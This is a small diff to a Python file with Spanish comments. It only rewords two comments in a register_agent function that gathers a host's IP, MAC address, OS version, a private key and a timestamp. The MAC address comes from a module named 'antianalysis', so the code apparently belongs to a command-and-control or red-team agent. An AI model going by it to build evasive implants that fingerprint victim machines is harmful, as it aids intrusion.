@@ -38,8 +38,8 @@ def get_agent_id(): # Obtener el agent_id desde el archivo JSON
         return None
 
 def register_agent():
-    ip = get_ip_address() # Obtener IP  
-    mac = antianalysis.get_mac_address() # Obtener MAC 
+    ip = get_ip_address() # Obtener dirección IP  
+    mac = antianalysis.get_mac_address() # Obtener dirección MAC 
     so = platform.system() + " " + platform.version() # Obtener S.O y versión 
     private_key = load_private_key() # Cargar clave privada
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Obtener fecha y hora actuales
